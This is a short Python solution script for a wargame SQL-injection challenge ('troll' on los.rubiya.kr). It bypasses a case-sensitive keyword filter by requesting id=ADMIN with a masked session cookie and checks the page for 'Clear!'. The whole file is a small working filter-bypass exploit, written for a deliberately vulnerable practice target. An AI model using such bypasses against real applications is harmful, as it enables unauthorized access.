#!/usr/bin/env python3

'''
# Summary
- if the filter do not filter lower or upper case, we can bypass it
'''


import requests

header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
url = "https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php"

payload = "?id=ADMIN"

response = requests.get(url + payload, headers=header)

result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[1]
    if end.find("admin") != -1:
        end = result.split("Clear!")[0].split("<h2>")[2]
    print(end+"Clear!")